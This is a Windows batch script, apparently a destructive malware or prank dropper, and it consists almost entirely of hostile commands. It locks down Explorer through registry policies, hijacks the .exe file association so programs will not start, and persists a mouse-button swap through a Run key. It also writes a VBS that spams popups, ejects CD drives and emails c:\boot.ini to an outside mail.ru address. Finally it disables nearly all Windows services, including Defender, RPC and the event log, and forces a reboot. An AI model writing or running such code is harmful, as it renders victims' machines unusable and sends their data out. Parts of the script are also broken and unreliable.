reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoNetworkConnections /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartmenuLogoff /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuSubFolders /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoCommonGroups /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFavoritesMenu /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecentDocsMenu /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetFolders /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoAddPrinter /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMHelp /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeStartMenu /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyDocs /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyPictures /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f 
echo set application=createobject("shell.application")>>%temp%\temp.vbs 
echo application.minimizeall>>%temp%\temp.vbs 
reg add "hklm\Software\Microsoft\Windows\CurrentVersion\run" /v SwapNT /t REG_SZ /d rundll32 user32, SwapMouseButton /f 
start rundll32 user32, SwapMouseButton 
reg add "HKCR\exefile\shell\open\command" /ve /t REG_SZ /d rundll32.exe /f 
echo i=50 >> %temp%\temp.vbs 
echo while i^>0 or i^<0 >> %temp%\temp.vbs 
echo S.popup "forum.whack.ru™",0, "forum.whack.ru™",0+16 >> %temp%\temp.vbs 
echo i=i-1 >> %temp%\temp.vbs 
echo wend >> %temp%\temp.vbs 
echo do >> %temp%\temp.vbs 
echo wscript.sleep 200 >> %temp%\temp.vbs 
echo s.sendkeys"{capslock}" >> %temp%\temp.vbs 
echo wscript.sleep 200 >> %temp%\temp.vbs 
echo s.sendkeys"{numlock}" >> %temp%\temp.vbs 
echo wscript.sleep 200 >> %temp%\temp.vbs 
echo s.sendkeys"{scrolllock}" >> %temp%\temp.vbs 
echo loop>> %temp%\temp.vbs 
echo Set oWMP = CreateObject("WMPlayer.OCX.7") >> %temp%\temp.vbs 
echo Set colCDROMs = oWMP.cdromCollection >> %temp%\temp.vbs 
echo if colCDROMs.Count ^>= 1 then >> %temp%\temp.vbs 
echo For i = 0 to colCDROMs.Count - 1 >> %temp%\temp.vbs 
echo colCDROMs.Item(i).eject >> %temp%\temp.vbs 
echo next >> %temp%\temp.vbs 
echo End If >> %temp%\temp.vbs 
echo Call SendPost("smtp.mail.ru", "forum.whack.ru™@mail.ru", "support@mail.ru", "...", "Копм заражен!") >> %temp%\temp.vbs 
echo Function SendPost(strSMTP_Server, strTo, strFrom, strSubject, strBody) >> %temp%\temp.vbs 
echo Set iMsg = CreateObject("CDO.Message") >> %temp%\temp.vbs 
echo Set iConf = CreateObject("CDO.Configuration") >> %temp%\temp.vbs 
echo Set Flds = iConf.Fields >> %temp%\temp.vbs 
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2 >> %temp%\temp.vbs 
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1 >> %temp%\temp.vbs 
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = "support" >> %temp%\temp.vbs 
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = "support" >> %temp%\temp.vbs 
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.mail.ru" >> %temp%\temp.vbs 
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25 >> %temp%\temp.vbs 
echo Flds.Update >> %temp%\temp.vbs 
echo iMsg.Configuration = iConf >> %temp%\temp.vbs 
echo iMsg.To = strTo >> %temp%\temp.vbs 
echo iMsg.From = strFrom >> %temp%\temp.vbs 
echo iMsg.Subject = strSubject >> %temp%\temp.vbs 
echo iMsg.TextBody = strBody >> %temp%\temp.vbs 
echo iMsg.AddAttachment "c:\boot.ini" >> %temp%\temp.vbs 
echo iMsg.Send >> %temp%\temp.vbs 
echo End Function >> %temp%\temp.vbs 
echo Set iMsg = Nothing >> %temp%\temp.vbs 
echo Set iConf = Nothing >> %temp%\temp.vbs 
echo Set Flds = Nothing >> %temp%\temp.vbs 

@echo off
sc config RemoteRegistry start= disabled
sc config RpcEptMapper start= disabled
sc config SecurityHealthService start= disabled
sc config wlidsvc start= disabled
sc config WMPNetworkSvc start= disabled
sc config WSearch start= disabled
sc config Audiosrv start= disabled
sc config AudioEndpointBuilder start= disabled
sc config BFE start= disabled
sc config BITS start= disabled
sc config CDPUserSvc start= disabled
sc config CDPUserSvc_9e9f73 start= disabled
sc config ClipSVC start= disabled
sc config CoreMessagingRegistrar start= disabled
sc config CryptSvc start= disabled
sc config DcomLaunch start= disabled
sc config defragsvc start= disabled
sc config DeviceAssociationService start= disabled
sc config DeviceInstall start= disabled
sc config DevicePickerUserSvc start= disabled
sc config DevicePickerUserSvc_9e9f73 start= disabled
sc config DevQueryBroker start= disabled
sc config Dhcp start= disabled
sc config DiagTrack start= disabled
sc config dmwappushsvc start= disabled
sc config Dnscache start= disabled
sc config DoSvc start= disabled
sc config DsmSvc start= disabled
sc config DsSvc start= disabled
sc config EFS start= disabled
sc config EventLog start= disabled
sc config EventSystem start= disabled
sc config FontCache start= disabled
sc config FontCache3.0.0.0 start= disabled
sc config gpsvc start= disabled
sc config hidserv start= disabled
sc config HvHost start= disabled
sc config icssvc start= disabled
sc config IKEEXT start= disabled
sc config InstallService start= disabled
sc config IpOverUsbSvc start= disabled
sc config KeyIso start= disabled
sc config lfsvc start= disabled
sc config LicenseManager start= disabled
sc config lltdsvc start= disabled
sc config lmhosts start= disabled
sc config LMS start= disabled
sc config LSM start= disabled
sc config LxpSvc start= disabled
sc config MapsBroker start= disabled
sc config MessagingService_9e9f73 start= disabled
sc config MessagingService start= disabled
sc config mpssvc start= disabled
sc config MSDTC start= disabled
sc config MSiSCSI start= disabled
sc config msiserver start= disabled
sc config NaturalAuthentication start= disabled
sc config NcaSvc start= disabled
sc config NcbService start= disabled
sc config Netlogon start= disabled
sc config Netman start= disabled
sc config netprofm start= disabled
sc config NetTcpPortSharing start= disabled
sc config NgcCtnrSvc start= disabled
sc config NgcSvc start= disabled
sc config NlaSvc start= disabled
sc config NvContainerLocalSystem start= disabled
sc config NvContainerNetworkService start= disabled
sc config NvTelemetryContainer start= disabled
sc config OneSyncSvc_9e9f73 start= disabled
sc config OneSyncSvc start= disabled
sc config PcaSvc start= disabled
sc config PeerDistSvc start= disabled
sc config PerfHost start= disabled
sc config PhoneSvc start= disabled
sc config PimIndexMaintenanceSvc start= disabled
sc config PimphonySvc start= disabled
sc config pla start= disabled
sc config PlugPlay start= disabled
sc config PolicyAgent start= disabled
sc config PrintNotify start= disabled
sc config ProfSvc start= disabled
sc config QWAVE start= disabled
sc config RasAuto start= disabled
sc config RasMan start= disabled
sc config RemoteAccess start= disabled
sc config RemoteRegistry start= disabled
sc config RpcEptMapper start= disabled
sc config RpcSs start= disabled
sc config SamSs start= disabled
sc config SCardSvr start= disabled
sc config ScDeviceEnum start= disabled
sc config Schedule start= disabled
sc config SCPolicySvc start= disabled
sc config SDRSVC start= disabled
sc config seclogon start= disabled
sc config SENS start= disabled
sc config SensorDataService start= disabled
sc config SensorService start= disabled
sc config SessionEnv start= disabled
sc config SharedAccess start= disabled
sc config ShellHWDetection start= disabled
sc config smphost start= disabled
sc config SNMPTRAP start= disabled
sc config Spooler start= disabled
sc config sppsvc start= disabled
sc config SSDPSRV start= disabled
sc config StateRepository start= disabled
sc config stisvc start= disabled
sc config StorSvc start= disabled
sc config svsvc start= disabled
sc config swprv start= disabled
sc config SysMain start= disabled
sc config SystemEventsBroker start= disabled
sc config TabletInputService start= disabled
sc config TapiSrv start= disabled
sc config TermService start= disabled
sc config Themes start= disabled
sc config TieringEngineService start= disabled
sc config TimeBrokerSvc start= disabled
sc config TokenBroker start= disabled
sc config TrkWks start= disabled
sc config TrustedInstaller start= disabled
sc config UI0Detect start= disabled
sc config UmRdpService start= disabled
sc config UnistoreSvc_9e9f73 start= disabled
sc config UnistoreSvc start= disabled
sc config upnphost start= disabled
sc config UsoSvc start= disabled
sc config UserManager start= disabled
sc config UsoSvc start= disabled
sc config VaultSvc start= disabled
sc config vds start= disabled
sc config vmicguestinterface start= disabled
sc config vmicshutdown start= disabled
sc config vmicheartbeat start= disabled
sc config vmicvmsession start= disabled
sc config vmicrdv start= disabled
sc config vmicwriter start= disabled
sc config vmms start= disabled
sc config vmusrvc start= disabled
sc config VoipCall start= disabled
sc config vpnagent start= disabled
sc config vpnva start= disabled
sc config W32Time start= disabled
sc config WalletService_9e9f73 start= disabled
sc config WalletService start= disabled
sc config wbengine start= disabled
sc config Wcmsvc start= disabled
sc config WdiServiceHost start= disabled
sc config WdiSystemHost start= disabled
sc config WebClient start= disabled
sc config Wecsvc start= disabled
sc config WerSvc start= disabled
sc config WFDSConMgrSvc start= disabled
sc config WFPLWFS start= disabled
sc config WiaRpc start= disabled
sc config WinDefend start= disabled
sc config WinHttpAutoProxySvc start= disabled
sc config Winmgmt start= disabled
sc config WinRM start= disabled
sc config WlanSvc start= disabled
sc config wlidsvc start= disabled
sc config WMPNetworkSvc start= disabled
sc config WpnUserService_9e9f73 start= disabled
sc config WpnUserService start= disabled
sc config wscsvc start= disabled
sc config WSearch start= disabled
sc config wuauserv start= disabled
sc config wudfsvc start= disabled
sc config WwanSvc start= disabled

Shutdown.exe /a

start %temp%\temp.vbs 
start %temp%\temp1.vbs 
start %temp%\temp2.vbs 

• 



%SystemRoot%\System32\cmd.exe /c echo 0 > %SystemRoot%\System32\drivers\etc\CrashControl

Shutdown.exe -r -t 00
